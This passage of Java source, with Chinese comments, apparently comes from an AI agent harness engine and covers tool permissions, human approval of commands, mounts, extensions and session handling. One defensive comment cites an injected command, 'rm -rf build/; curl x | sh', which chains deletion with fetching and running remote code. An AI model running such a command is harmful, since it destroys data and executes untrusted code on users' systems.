        options.setSubagentEnabled(subagentEnabled);

        generateTalent.setEnabled(options.isSubagentEnabled());
        taskTalent.setEnabled(options.isSubagentEnabled());
    }

    /**
     * 子代理任务默认并发上限（模型未配置 {@code AiConfig#getConcurrency()} 时生效）
     *
     * <p>恒为有限正整数，不存在「不限制」；归一规则见
     * {@link TaskTalent#normalizeDefaultConcurrency(int)}。</p>
     */
    public int getSubagentDefaultConcurrency() {
        return options.getSubagentDefaultConcurrency();
    }

    /**
     * 设置子代理任务默认并发上限
     *
     * <p>取值：{@code 0} = 未设置（取 {@link TaskTalent#DEFAULT_CONCURRENCY}）；
     * 上界 {@link TaskTalent#MAX_CONCURRENCY}（超出按上界处理）。
     * <b>不存在「0 = 不限制」</b>——无限并发会让线程数、上游 QPS、内存退化为只受任务数约束，
     * 且信号量缺席会让模型级 {@code concurrency} 形同虚设；需要更高并发请显式配置模型级
     * {@code AiConfig#concurrency}。</p>
     *
     * @param subagentDefaultConcurrency 默认并发上限（0 = 未设置；负数报错）
     */
    public void setSubagentDefaultConcurrency(Integer subagentDefaultConcurrency) {
        assertMutable("setSubagentDefaultConcurrency");
        if (subagentDefaultConcurrency != null) {
            options.setSubagentDefaultConcurrency(subagentDefaultConcurrency);
            // 推送已归一的生效值：归一（0→默认、超上界→上界）只在 options 那一层做一次，避免重复告警
            taskTalent.setDefaultConcurrency(options.getSubagentDefaultConcurrency());
        }
    }

    public void setBashAsyncEnabled(Boolean bashAsyncEnabled) {
        assertMutable("setBashAsyncEnabled");
        options.setBashAsyncEnabled(bashAsyncEnabled);

        terminalTalent.setBashAsyncEnabled(bashAsyncEnabled);
    }

    public void setSessionWindowSize(Integer sessionWindowSize) {
        options.setSessionWindowSize(sessionWindowSize);
    }

    public void setCompressionThreshold(Integer maxMessages, Double maxContextRatio) {
        if (maxMessages != null) {
            options.setCompressionMaxMessages(maxMessages);
            options.getCompressionInterceptor().setMaxMessages(maxMessages);
        }

        if (maxContextRatio != null) {
            options.setCompressionMaxContextRatio(maxContextRatio);
            options.getCompressionInterceptor().setMaxContextLengthRatio(maxContextRatio);
        }
    }

    public void setCompressionDefaultContextLength(Long defaultContextLength) {
        if (defaultContextLength != null) {
            options.setCompressionDefaultContextLength(defaultContextLength);
            options.getCompressionInterceptor().setDefaultContextLength(defaultContextLength);
        }
    }


    public void setSystemPrompt(String systemPrompt) {
        assertMutable("setSystemPrompt");
        if (Assert.isNotEmpty(systemPrompt)) {
            options.setSystemPrompt(systemPrompt);
        }
    }

    public void setCacheControl(CacheControl cacheControl) {
        assertMutable("setCacheControl");
        if (cacheControl != null) {
            options.setCacheControl(cacheControl);
        }
    }

    // ========== 引擎级 http 定制（运行时动态切换） ==========

    /**
     * 动态切换引擎级代理（host/port 形式）。O(1) 生效，无需重建 Agent/模型。
     *
     * @since 4.0.5
     */
    public void setHttpProxy(String host, int port) {
        assertMutable("setHttpProxy");
        options.setHttpProxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(host, port)));
    }

    /**
     * 动态切换引擎级代理（java.net.Proxy 形式）；传 null 恢复直连。
     *
     * @since 4.0.5
     */
    public void setHttpProxy(Proxy proxy) {
        assertMutable("setHttpProxy");
        options.setHttpProxy(proxy);
    }

    public Proxy getHttpProxy() {
        return options.getHttpProxy();
    }

    /**
     * 动态设置引擎级 http 定制钩子（每次 LLM 请求创建 HttpUtils 后执行）。
     *
     * @since 4.0.5
     */
    public void addHttpCustomize(Consumer<HttpUtils> httpCustomize) {
        assertMutable("addHttpCustomize");
        options.addHttpCustomize(httpCustomize);
    }

    public void setHttpCustomize(Consumer<HttpUtils> httpCustomize) {
        assertMutable("setHttpCustomize");
        options.setHttpCustomize(httpCustomize);
    }

    public Consumer<HttpUtils> getHttpCustomize() {
        return options.getHttpCustomize();
    }

    // ========== 动态模型管理 ==========

    public void setDefaultModel(String defaultModel) {
        assertMutable("setDefaultModel");
        String oldDefault = options.getDefaultModel();
        options.setDefaultModel(defaultModel);

        if (mainAgent != null
                && !defaultModel.equals(oldDefault)
                && (oldDefault == null || oldDefault.equals(mainAgent.getModel().getNameOrModel()))) {
            refreshMainAgent();
        }
    }

    public void addModel(ChatConfig config) {
        assertMutable("addModel");
        options.addModel(config);

        if (mainAgent != null && mainAgent.getModel().getNameOrModel().equals(config.getNameOrModel())) {
            refreshMainAgent();
        }
    }

    public void removeModel(String name) {
        assertMutable("removeModel");
        options.removeModel(name);

        if (mainAgent != null && mainAgent.getModel().getNameOrModel().equals(name)) {
            refreshMainAgent();
        }
    }

    public boolean hasModel(String name) {
        return options.hasModel(name);
    }

    /**
     * 动态授权一个工具（允许使用）
     */
    public void allowTool(String toolName) {
        assertMutable("allowTool");
        if (Assert.isEmpty(toolName)) {
            return;
        }

        options.getDisallowedTools().remove(toolName);
        options.getTools().add(toolName);

        // 权限变更需要重建 Agent 以重新生成工具集
        rebuildMainAgentIfBuilt();
    }

    public void allowToolReset(Collection<String> tools) {
        assertMutable("allowToolReset");
        options.getTools().clear();
        if (tools != null) {
            options.getTools().addAll(tools);
        }

        // 权限变更需要重建 Agent 以重新生成工具集
        rebuildMainAgentIfBuilt();
    }

    /**
     * 一次性重置工具白名单与黑名单，并只重建一次主 Agent。
     * <p>避免连续调用 {@link #allowToolReset} + {@link #disallowToolReset} 导致双倍重建抖动。</p>
     */
    public void toolPermissionReset(Collection<String> tools, Collection<String> disallowedTools) {
        assertMutable("toolPermissionReset");
        options.getTools().clear();
        if (tools != null) {
            options.getTools().addAll(tools);
        }

        options.getDisallowedTools().clear();
        if (disallowedTools != null) {
            options.getDisallowedTools().addAll(disallowedTools);
        }

        rebuildMainAgentIfBuilt();
    }

    /**
     * 动态撤销一个工具的权限（禁用）
     */
    public void disallowTool(String toolName) {
        assertMutable("disallowTool");
        if (Assert.isEmpty(toolName)) {
            return;
        }

        options.getTools().remove(toolName);
        options.getDisallowedTools().add(toolName);

        rebuildMainAgentIfBuilt();
    }

    public void disallowToolReset(Collection<String> disallowedTools) {
        assertMutable("disallowToolReset");
        options.getDisallowedTools().clear();
        if (disallowedTools != null) {
            options.getDisallowedTools().addAll(disallowedTools);
        }

        // 权限变更需要重建 Agent 以重新生成工具集
        rebuildMainAgentIfBuilt();
    }


    public void addMount(Mount mount) {
        assertMutable("addMount");
        // 内置挂载不可被同名覆盖
        if (mount != null && BUILTIN_AGENT_MOUNT.equals(normalizeMountAlias(mount.getAlias()))) {
            throw new IllegalArgumentException("Built-in mount cannot be replaced: " + BUILTIN_AGENT_MOUNT);
        }
        // 同别名替换时，清除旧挂载关联的运行时定义。
        if (mount != null && options.mountManager.hasMount(mount.getAlias())) {
            String key = mount.getAlias().startsWith("@") ? mount.getAlias() : "@" + mount.getAlias();
            agentManager.removeByMountAlias(key);
        }

        options.mountManager.register(mount);
    }

    public void removeMount(String alias) {
        assertMutable("removeMount");
        if (BUILTIN_AGENT_MOUNT.equals(normalizeMountAlias(alias))) {
            throw new IllegalArgumentException("Built-in mount cannot be removed: " + BUILTIN_AGENT_MOUNT);
        }
        String key = alias.startsWith("@") ? alias : "@" + alias;
        agentManager.removeByMountAlias(key);

        options.mountManager.remove(alias);
    }

    private static String normalizeMountAlias(String alias) {
        if (alias == null) return null;
        return alias.startsWith("@") ? alias : "@" + alias;
    }

    public boolean hasMount(String alias) {
        return options.mountManager.hasMount(alias);
    }

    public void refreshMount(@Nullable String alias) {
        if (alias != null) {
            String key = alias.startsWith("@") ? alias : "@" + alias;
            agentManager.removeByMountAlias(key);
        } else {
            agentManager.clearCustomAgents();
        }

        if (alias == null) {
            skillCatalog.refresh();
            agentCatalog.refresh();
        } else {
            skillCatalog.refreshByMount(alias);
            agentCatalog.refreshByMount(alias);
        }
    }


    /**
     * 动态添加 API 源
     */
    public void addApiServer(ApiSource apiSource) {
        assertMutable("addApiServer");
        openApiGatewayTalent.addApi(apiSource);
        options.getApiServers().put(apiSource.getDocUrl(), apiSource);
    }

    /**
     * 获取指定 docUrl 的 ApiSourceClient
     */
    public ApiSourceClient getApiServer(String docUrl) {
        return openApiGatewayTalent.getApiSource(docUrl);
    }

    /**
     * 刷新指定 API 源（权限变更后）
     */
    public void refreshApiServer(String docUrl) {
        openApiGatewayTalent.refreshApi(docUrl);
    }

    /**
     * 动态移除 API 源
     */
    public void removeApiServer(String docUrl) {
        assertMutable("removeApiServer");
        openApiGatewayTalent.removeApi(docUrl);
        options.getApiServers().remove(docUrl);
    }

    /**
     * 动态添加 MCP 服务
     */
    public void addMcpServer(String name, McpServerParameters mcpServer) {
        assertMutable("addMcpServer");
        mcpGatewayTalent.addMcpServer(name, mcpServer);
        options.getMcpServers().put(name, mcpServer);
    }

    public McpClientProvider getMcpServer(String name) {
        return mcpGatewayTalent.getMcpServer(name);
    }

    public void refreshMcpServer(String name) {
        mcpGatewayTalent.refreshMcpServer(name);
    }

    /**
     * 动态移除 MCP 服务（并关闭连接）
     */
    public void removeMcpServer(String name) {
        assertMutable("removeMcpServer");
        mcpGatewayTalent.removeMcpServer(name);
        options.getMcpServers().remove(name);
    }

    /**
     * 动态添加一个 LSP 服务器
     */
    public void addLspServer(String name, LspServerParameters lspServer) {
        assertMutable("addLspServer");
        if (lspServer == null) {
            return;
        }

        // 将配置同步到 options 中，以便后续快照使用
        options.getLspServers().put(name, lspServer);
        // 让 LspManager 运行时加载该服务器
        lspManager.registerServer(name, lspServer);

        // LSP 工具的增减会影响 Agent 的可用工具集，需重建 Agent
        rebuildMainAgentIfBuilt();
    }

    /**
     * 动态移除一个 LSP 服务器
     */
    public void removeLspServer(String name) {
        assertMutable("removeLspServer");
        if (name == null) {
            return;
        }

        options.getLspServers().remove(name);
        lspManager.unregisterServer(name);

        rebuildMainAgentIfBuilt();
    }


    /**
     * 动态开关一个扩展
     * <p>
     * 扩展的开关由两部分组成：
     * <ul>
     *   <li>{@code extension.setEnabled(...)}：扩展自己把状态传播给子组件（Talent / 拦截器 / 命令）；</li>
     *   <li>重建主代理：拦截器与才能是装配期下发的，必须在重建后生效（命令、拦截器内部判断即时生效）。</li>
     * </ul>
     * 未加入本引擎的扩展会先被加入（与 {@link #addExtension} 一致），便于「先建后开」的宿主。
     *
     * @param extension 目标扩展
     * @param enabled   true 开 / false 关 / null 不改变
     */
    public void setExtensionEnabled(HarnessExtension extension, Boolean enabled) {
        assertMutable("setExtensionEnabled");
        if (extension == null) {
            return;
        }

        extension.setEnabled(enabled);

        if (options.getExtensions().contains(extension) == false) {
            addExtension(extension);
            return;
        }

        //开关影响才能/拦截器装配，必须重建主代理（命令与拦截器的运行期判定本身即时生效）
        rebuildMainAgentIfBuilt();
    }

    /**
     * 按类型幂等挂载扩展：引擎上已有同类型（{@code extension.getClass()} 的实例）时不再添加。
     *
     * <p>{@link #addExtension} 只跳过同一实例（同类的另一个实例照常添加）；组合根装配插件时用本方法，
     * 重复装配拿到的是<b>已挂载</b>的那个实例：</p>
     *
     * <pre>{@code
     * engine.addExtensionIfAbsent(new SteerExtension());
     * engine.addExtensionIfAbsent(new QueueExtension());
     * GoalExtension goal = engine.addExtensionIfAbsent(GoalExtension.builder().build());
     * }</pre>
     *
     * @param extension 待挂载的扩展（null 时返回 null）
     * @return 实际生效的实例（已有则为已挂载者，否则为入参）
     * @since 4.2.0
     */
    @SuppressWarnings("unchecked")
    public <T extends HarnessExtension> T addExtensionIfAbsent(T extension) {
        if (extension == null) {
            return null;
        }

        agentLock.lock();
        try {
            Optional<? extends HarnessExtension> mounted = getExtension(extension.getClass());
            if (mounted.isPresent()) {
                return (T) mounted.get();
            }
            addExtension(extension);
            return extension;
        } finally {
            agentLock.unlock();
        }
    }

    /**
     * 动态挂载一个扩展（同一实例已挂载时直接跳过，不会二次回调 {@code onAttach}；同类的另一个实例照常添加）。
     */
    public void addExtension(HarnessExtension extension) {
        assertMutable("addExtension");
        if (extension == null) {
            return;
        }
        if (containsSame(options.getExtensions(), extension)) {
            return;
        }
        options.getExtensions().add(extension);

        //与构造器对称：动态添加的扩展也要触发初始化（此刻引擎已装配完毕，任意引擎方法都安全）。
        //嵌套调用安全：agentLock 可重入，且 mainAgent 尚未构建时重建分支会跳过。
        extension.onAttach(this);

        rebuildMainAgentIfBuilt();
    }

    /** 按引用查重（不用 equals：扩展可能自定义 equals，而重复 onAttach 只发生在同一实例上） */
    private static boolean containsSame(List<HarnessExtension> list, HarnessExtension extension) {
        for (HarnessExtension e : list) {
            if (e == extension) {
                return true;
            }
        }
        return false;
    }

    /**
     * 动态移除一个扩展
     */
    public void removeExtension(HarnessExtension extension) {
        assertMutable("removeExtension");
        if (extension == null) {
            return;
        }

        options.getExtensions().remove(extension);
        extension.onDetach(this);

        // 重建 mainAgent 以应用变更，使用 agentLock 保证线程安全
        rebuildMainAgentIfBuilt();
    }

    /**
     * 主代理已构建时重建它，让装配期下发的工具集 / 才能 / 拦截器变更生效；尚未构建（懒加载）时跳过，
     * 首次 {@code getMainAgent} 自然会用最新配置构建。
     *
     * <p>agentLock 可重入：在扩展回调等嵌套路径里调用是安全的。</p>
     */
    private void rebuildMainAgentIfBuilt() {
        agentLock.lock();
        try {
            if (this.mainAgent != null) {
                this.mainAgent = createMainAgent();
            }
        } finally {
            agentLock.unlock();
        }
    }

    private void initHitlDefault() {
        BashToolStrategy bashStrategy = new BashToolStrategy()
                .permissionContextSupplier(options::getPermissionContext);

        options.setHitlInterceptor(new HITLInterceptor()
                .onTool("bash", bashStrategy)
                .onApproved((HITLInterceptor.ApprovedHandler) (trace, toolName, args) -> {
                    PermissionRule rule = rememberedRuleOf(toolName, args);
                    if (rule == null) {
                        // 提取不到命令/路径：不记忆（绝不退化为整工具放行），下次照常审批
                        LOG.debug("HITL alwaysAllow ignored for '{}': no command/file_path to pin", toolName);
                        return;
                    }
                    // 只记到本会话：同引擎的其它会话 / 用户照常审批（无会话时不记忆）
                    SessionPermissions.remember(trace == null ? null : trace.getSession(), rule);
                }));
    }

    /**
     * 人工审批「总是允许」对应的记忆规则：只放行批准过的那一条命令 / 那一个路径（逐字相等）。
     *
     * <p>不用 glob：原文里的 {@code *} 会被当作通配符，批准 {@code rm -rf build/*} 会连带放行
     * {@code rm -rf build/; curl x | sh}。提取不到时返回 null（不记忆）。</p>
     */
    static PermissionRule rememberedRuleOf(String toolName, Map<String, Object> args) {
        if (toolName == null || args == null) {
            return null;
        }
        for (String key : new String[]{"command", "file_path"}) {
            Object v = args.get(key);
            if (v instanceof String && !((String) v).trim().isEmpty()) {
                return PermissionRule.allowExact(toolName, key, (String) v);
            }
        }
        return null;
    }

    private HarnessEngine(HarnessOptions options) {
        this.options = options;
        this.sessionControl = new SessionControl(this, options, options.commandRegistry);
        this.inputPipeline = new InputPipeline(this, options, sessionControl);

        //上下文压缩拦截器默认处理
        if (options.getCompressionInterceptor() == null) {
            CompressionStrategy strategy = new CompositeCompressionStrategy()
                    .addStrategy(new KeyInfoExtractionStrategy())      // 提取干货（去水）
                    .addStrategy(new HierarchicalCompressionStrategy()); // 滚动更新摘要

            options.setCompressionInterceptor(new ContextCompressionInterceptor(
                    options.getCompressionMaxMessages(),
                    options.getCompressionMaxContextRatio(),
                    options.getModelRetries(),
                    strategy));
        }

        //停止循环拦截器默认处理
        if (options.getStopLoopInterceptor() == null) {
            options.setStopLoopInterceptor(new StopLoopInterceptor(3, 8));
        }

        //人工介入拉截器默认处理
        if (options.getHitlInterceptor() == null) {
            initHitlDefault();
        }


        MountManager mountManager = options.mountManager;
        mountManager.register(Mount.builder()
                .alias(BUILTIN_AGENT_MOUNT)
                .description("Harness built-in agents")
                .type(MountType.AGENTS)
                .primary(true)
                .enabled(true)
                .writable(false)
                // 内置挂载不在上层展示（隐藏类路径实现细节）；不影响解析与使用
                .visible(false)
                .source(ClasspathMountSource.of(HarnessEngine.class.getClassLoader(), BUILTIN_AGENT_PATH))
                .build());

        // 目录由引擎创建并订阅挂载变更（MountManager 只管挂载表，不认识技能/子代理）
        this.skillCatalog = new DefaultSkillCatalog(mountManager);
        this.agentCatalog = new DefaultAgentCatalog(mountManager);

        // 清单是会话级状态：经数据来源读写（默认 <workspace>/<harnessHome>/sessions/<sid>/TODO.md，与旧路径一致）
        this.todoTalent = new TodoTalent(options.getStateSource(), "sessions/");
        this.codeTalent = new CodeTalent(options.getWorkspace(), options.getHarnessHome());
        this.taskTalent = new TaskTalent(this, options.getTaskExecutor());
        // 将配置面的默认并发推送到执行者（yaml / Builder / setter 三种入口都只写 options）
        this.taskTalent.setDefaultConcurrency(options.getSubagentDefaultConcurrency());
        this.generateTalent = new GenerateTalent(this);

        this.clockTalent = new ClockTalent();

        this.codeSearchTalent = new CodeSearchTalent().retryConfig(options.getMcpRetries());
        this.websearchTalent = new WebsearchTalent().retryConfig(options.getMcpRetries());
        this.webfetchTalent = new WebfetchTalent().retryConfig(options.getApiRetries());

        //lsp
        this.lspManager = new LspManager(options.getWorkspace());
        if (Assert.isNotEmpty(options.getLspServers())) {
            for (Map.Entry<String, LspServerParameters> entry : options.getLspServers().entrySet()) {
                lspManager.registerServer(entry.getKey(), entry.getValue());
            }
        }
        this.lspTalent = new LspTalent(lspManager, options.getWorkspace());
        this.lspManager.setDiagnosticsCallback(lspTalent::updateDiagnostics);
        if (options.mountManager != null) {
            //lsp 工具的路径入参要与 read/grep 一致地支持挂载点逻辑路径，否则同一个 @xx/a.java
            //能 read 却做不了导航，只报「文件不存在」
            this.lspTalent.setPathResolver(options.mountManager::resolve);
        }

        if (options.getMemoryProvider() != null) {
            this.memoryTalent = new MemoryTalent(options.getMemoryProvider())
                    .sessionIsolation(options.isMemorySessionIsolation())
                    .relevanceCount(options.getMemoryRelevanceCount())
                    .priorityCount(options.getMemoryPriorityCount())
                    .summaryLength(options.getMemorySummaryLength());
            this.memoryTalent.setEnabled(options.isMemoryEnabled());
        } else {
            this.memoryTalent = null;
        }

        openApiGatewayTalent = new OpenApiGatewayTalent().retryConfig(options.getApiRetries());
        if (Assert.isNotEmpty(options.getApiServers())) {
            for (Map.Entry<String, ApiSource> entry : options.getApiServers().entrySet()) {
                openApiGatewayTalent.addApi(entry.getValue());
            }
        }

        mcpGatewayTalent = new McpGatewayTalent().retryConfig(options.getMcpRetries());

        if (Assert.isNotEmpty(options.getMcpServers())) {
            for (Map.Entry<String, McpServerParameters> entry : options.getMcpServers().entrySet()) {
                if (entry.getValue().isEnabled()) {
                    mcpGatewayTalent.addMcpServer(entry.getKey(), entry.getValue());
                }
            }
        }

        //受保护的 <hh>commands|agents 与物化缓存 ~/<hh>cache/mount 都跟随引擎配置的 harnessHome
        terminalTalent = new TerminalTalent(options.mountManager, options.getHarnessHome());
        skillTalent = new SkillTalent(this.skillCatalog);

        agentManager = new AgentManager(this.agentCatalog);

        terminalTalent.setBashAsyncEnabled(options.isBashAsyncEnabled());
        terminalTalent.setSandboxEnabled(options.isSandboxEnabled());
        terminalTalent.setSandboxAllowUserHome(options.isSandboxAllowUserHome());
        terminalTalent.setSandboxSystemRestrict(options.isSandboxSystemRestrict());
        terminalTalent.setSandboxSelfBootstrap(options.isSandboxSelfBootstrap());
        //harness 状态目录（缺省在工作区内）对模型不可读写：里面是其它会话/用户的数据
        terminalTalent.setProtectedStatePaths(options.getProtectedStatePaths());
        // cwdPolicy 同时在消费端生效：请求级 toolContext 或直接写会话属性的 __cwd 也绕不过去
        final Predicate<String> cwdPolicy = options.getCwdPolicy();
        if (cwdPolicy != null) {
            terminalTalent.setWorkRootPolicy(path -> cwdPolicy.test(path.toString()));
        }

        //LSP 与文件工具接线：诊断靠 write/edit 自动注入（不依赖模型主动调工具），read 后异步预热。
        //钩子内部会在总开关关闭 / 文件类型无匹配服务器 / 服务器已知启动失败时零成本短路。
        terminalTalent.setFileDiagnosticsHook(lspTalent::reportFileDiagnostics);
        terminalTalent.setFileWarmupHook(lspTalent::warmupFile);

        //mainAgent = createMainAgent(); //改为懒加载
    }

    protected ReActAgent createMainAgent() {
        AgentDefinition agentDefinition = AgentDefinition.builder()
                .primary(true) // 主代理
                .name(AgentDefinition.AGENT_MAIN) // 名字
                .toolsAdd(options.getTools()) // 工具权限
                .systemPrompt(options.getSystemPrompt())// 系统提示词
                .build();

        ReActAgent.Builder agentBuilder = getAgentBuilder(agentDefinition, null);

        return agentBuilder.build();
    }


    /**
     * 获取会话（不存在则新建）
     *
     * <p>只想取已存在的会话、不想顺带新建时，用 {@link #getSessionOrNull(String)}。</p>
     */
    public AgentSession getSession(String instanceId) {
        return options.getSessionProvider().getSession(instanceId, true);
    }

    /**
     * 获取已存在的会话（不存在返回 null，且不新建）
     *
     * <p>给定时任务、只读查询等「会话必须已存在」的场景用：用 {@link #getSession(String)}
     * 会把已删除的会话重新建出来。是否「存在」由会话提供者判定。</p>
     *
     * @since 4.2.0
     */
    @Nullable
    public AgentSession getSessionOrNull(String instanceId) {
        if (instanceId == null || instanceId.isEmpty()) {
            return null;
        }
        return options.getSessionProvider().getSession(instanceId, false);
    }

    /**
     * 永久删除会话的引擎侧善后：通知全部扩展 {@link HarnessExtension#onSessionRemove}
     * （如撤掉该会话的定时任务）。
     *
     * <p><b>只做通知</b>：不取会话实例、不删存储、不判忙——这三件归宿主。
     * 宿主删除顺序固定为：判忙（忙则拒绝）→ 本方法 → 移出内存 → 删除存储。
     * 本方法必须在删除存储之前调用，否则定时任务可能在中间时段触发，把会话重新建出来。</p>
     *
     * <p>只是把会话移出内存（下次还会重建）时<b>不要</b>调用本方法。</p>
     *
     * @param sessionId 会话标识（null 或空串直接返回）
     * @since 4.2.0
     */
    public void removeSession(String sessionId) {
        if (sessionId == null || sessionId.isEmpty()) {
            return;
        }
        sessionControl.removeSession(sessionId);
    }




    public ChatModel getMainModel() {
        return getMainAgent().getModel();
    }

    public ReActAgent getMainAgent() {
        ReActAgent agent = this.mainAgent; // 引入局部变量，仅执行一次 volatile read
        if (agent == null) {
            agentLock.lock();
            try {
                if (this.mainAgent == null) {
                    this.mainAgent = createMainAgent();
                }
                agent = this.mainAgent;
            } finally {
                agentLock.unlock();
            }
        }

        return agent;
    }

    /**
     * 刷新主代理
     */
    public void refreshMainAgent() {
        agentLock.lock();
        try {
            this.mainAgent = null;
        } finally {
            agentLock.unlock();
        }
    }

    public ReActAgent getAgentOrMain(String agentName) {
        return getAgentOrMain(null, agentName);
    }

    /**
     * 会话感知版：先查本会话的会话级子代理，再查引擎级；都没有时回落主代理。
     *
     * @since 4.2.0
     */
    public ReActAgent getAgentOrMain(@Nullable AgentSession session, String agentName) {
        AgentDefinition definition = resolveAgent(session, agentName);
        if (definition == null) {
            return getMainAgent();
        }
        return getAgentBuilder(definition, null).build();
    }

    public ReActAgent.Builder getAgentBuilder(AgentDefinition definition) {
        return getAgentBuilder(definition, null);
    }

    public ReActAgent.Builder getAgentBuilder(AgentDefinition definition, @Nullable String sessionModel) {
        return AgentFactory.create(this, definition, sessionModel);
    }

    public ReActAgent.Builder getAgentBuilderOrNil(String agentName, String sessionModel) {
        return getAgentBuilderOrNil(null, agentName, sessionModel);
    }

    /**
     * 会话感知的子代理构建器（先查本会话的会话级子代理，再查引擎级）
     *
     * @since 4.2.0
     */
    public ReActAgent.Builder getAgentBuilderOrNil(@Nullable AgentSession session, String agentName, String sessionModel) {
        AgentDefinition definition = resolveAgent(session, agentName);
        if (definition == null) {
            return null;
        }

        return getAgentBuilder(definition, sessionModel);
    }

    /**
     * 会话感知的子代理解析：先本会话的会话级子代理（{@link SessionAgents}），再引擎级（含挂载目录）。
     *
     * @return 不存在时为 null
     * @since 4.2.0
     */
    @Nullable
    public AgentDefinition resolveAgent(@Nullable AgentSession session, @Nullable String agentName) {
        if (Assert.isEmpty(agentName)) {
            return null;
        }
        AgentDefinition local = SessionAgents.get(session, agentName);
        return local != null ? local : agentManager.getAgentOrNil(agentName);
    }

    /**
     * 是否为保留的子代理名（{@code main}、{@code general} 与内置挂载提供的代理）：不能被 {@code generate} 创建。
     *
     * @since 4.2.0
     */
    public boolean isReservedAgentName(@Nullable String agentName) {
        if (Assert.isEmpty(agentName)) {
            return true;
        }
        if (AgentDefinition.AGENT_MAIN.equals(agentName) || AgentDefinition.AGENT_GENERAL.equals(agentName)) {
            return true;
        }
        for (AgentDescriptor d : agentCatalog.getAgentsByMount(BUILTIN_AGENT_MOUNT)) {
            if (agentName.equals(d.getName())) {
                return true;
            }
        }
        return false;
    }

    /**
     * 全局子代理持久化策略（{@code generate(saveToFile=true)} 前判定）。缺省按 {@code runtimeMutable}：
     * CODING 允许、SERVER 拒绝（持久化等于修改同引擎所有用户可见的全局配置）。
     *
     * @since 4.2.0
     */
    public BiPredicate<AgentSession, AgentDefinition> getAgentPersistPolicy() {
        BiPredicate<AgentSession, AgentDefinition> policy = options.getAgentPersistPolicy();
        return policy != null ? policy : (s, d) -> options.isRuntimeMutable();
    }

    /**
     * 弃用但不能删掉（向下兼容需要）
     *
     * @deprecated 4.2.0 {@link #handle(HarnessInput)}
     */
    public ReActRequest prompt(Prompt prompt) {
        return promptDo(prompt, null);
    }

    /**
     * 弃用但不能删掉（向下兼容需要）
     *
     * @deprecated 4.2.0 {@link #handle(HarnessInput)}
     */
    public ReActRequest prompt(Prompt prompt, ReActAgent targetAgent) {
        return promptDo(prompt, targetAgent);
    }


    /**
     * 弃用但不能删掉（向下兼容需要）
     *
     * @deprecated 4.2.0 {@link #handle(HarnessInput)}
     */
    public ReActRequest prompt(String prompt) {
        return promptDo(Prompt.of(prompt), null);
    }


    /**
     * 弃用但不能删掉（向下兼容需要）
     *
     * @deprecated 4.2.0 {@link #handle(HarnessInput)}
     */
    public ReActRequest prompt(String prompt, ReActAgent targetAgent) {
        return promptDo(Prompt.of(prompt), targetAgent);
    }


    /**
     * 恢复执行（最近一个工作记忆）
     *
     * <p>弃用但不能删掉（向下兼容需要）</p>
     *
     * @since 4.2.0
     * @deprecated 4.2.0 {@link #handle(HarnessInput)}
     */
    public ReActRequest resume() {
        return promptDo(null, null);
    }

    /**
     * 恢复执行（最近一个工作记忆）
     *
     * <p>弃用但不能删掉（向下兼容需要）</p>
     *
     * @since 4.2.0
     * @deprecated 4.2.0 {@link #handle(HarnessInput)}
     */
    public ReActRequest resume(ReActAgent targetAgent) {
        return promptDo(null, targetAgent);
    }


    protected ReActRequest promptDo(Prompt prompt, ReActAgent targetAgent) {
        if (targetAgent == null) {
            targetAgent = getMainAgent();
        }

        final String agentName = targetAgent.name();

        // 与 targetAgent.prompt(prompt) 等价（ReActAgent 内部即 new ReActRequest(agent, prompt)），
        // 换成能携带受理占位的子类：handle 受理的 TASK 由请求自己在开流时释放占位。
        return new AdmittedRequest(targetAgent, prompt, activeRuns)
                .options(o -> {
                    o.retryConfig(options.getModelRetries());
                    o.maxTurns(options.getMaxTurns());
                    o.sessionWindowSize(options.getSessionWindowSize());

                    for (HarnessExtension extension : getExtensions()) {
                        if (extension.isEnabled()) {
                            extension.onRequestAssemble(this, agentName, false, o);
                        }
                    }
                });
    }



    /**
     * 处理一次输入（文本版）
     *
     * @see #handle(HarnessInput)
     */
    public InputOutcome handle(AgentSession session, String text) {
        return handle(HarnessInput.of(session, text));
    }


    /**
     * 处理一次完整输入（唯一执行入口）
     * <p>
     * 第 0 步是受理判定（与占位、入积压同一把会话锁）：会话忙时可排队的输入进积压
     * （{@link InputOutcome.Kind#DEFERRED}），不可排队或有待审批卡时拒绝（{@link InputOutcome.Kind#REJECTED}）；
     * 程序派发的一轮、忙时可执行的命令（{@code runnableWhenBusy}）与审批决策按输入本身放行。
     * 受理之后一次调用完成五件事：命令识别与执行、HITL 决策应用、附件装配 + 子代理解析、
     * Prompt 构建、请求装配。宿主只需关心「回执怎么渲染」与「流怎么消费」。
     *
     * <p><b>占位由引擎管</b>：返回 TASK 时会话保持占用，直到请求开流（{@code stream()} 订阅，运行流已登记）
     * 或 {@code call()} 结束——宿主把订阅调度到别的线程也不会出现两条流并发。宿主拿到 TASK 决定不执行时调
     * {@link InputOutcome#discard()}；其余结局在返回前已释放。</p>
     *
     * <p>HITL 决策与续流可合并为一次调用：{@code .hitl(action, callId).resume(true)} 会在写入决策后
     * 尝试续流。是否真的续流由引擎自检后决定，宿主只 switch {@link InputOutcome.Kind}：</p>
     * <ul>
     * <li>{@link InputOutcome.Kind#TASK} —— 已续流（决策写入，且本批已齐备）；</li>
     * <li>{@link InputOutcome.Kind#HITL} —— 未续流。再用 {@link InputOutcome#isHitlApplied()} 与
     * {@link InputOutcome#getPendingHitlCount()} 区分：决策未命中（过期卡）/ 本批尚有未决卡 / 宿主未传 resume。</li>
     * </ul>
     * <p>不传 {@code resume} 则只写决策，无论本批是否齐备都返回 {@link InputOutcome.Kind#HITL}。
     * 决策动作是 {@link org.noear.solon.ai.agent.react.intercept.HITLAction} 枚举，
     * 线上字符串的解析由宿主完成（{@code HITLAction.of(action)}）。</p>
     *
     * <pre>{@code
     * InputOutcome outcome = engine.handle(HarnessInput.of(session, input)
     *         .selectedModel(model).selectedAgent(agent));
     *
     * switch (outcome.getKind()) {
     *     case TASK:   // 有可执行的任务（命令触发的也在这里，回执由 isCommand() 读回）
     *         if (outcome.hasReply()) {
     *             render(outcome.getCommandOutput());
     *         }
     *         outcome.getRequest().stream().subscribe(event -> render(event));
     *         break;
     *     case REPLY:  // 只有回执（含命令在本渠道不可用）
     *         render(outcome.getCommandOutput());
     *         break;
     *     case DEFERRED: // 会话忙，已进积压：回执排队位置，并触发宿主自己的续发
     *         ackQueued(outcome.getBacklogPosition());
     *         break;
     *     case REJECTED: // 未受理（待审批 / 忙且无处可延 / 附件不能排队）
     *         renderError(outcome.getRejectReason(), outcome.getRejectDetail());
     *         break;
     *     case HITL:   // 决策已写入但未续流（未传 resume），是否恢复流由宿主决定
     *     default:     // IGNORED：无事可做
     *         break;
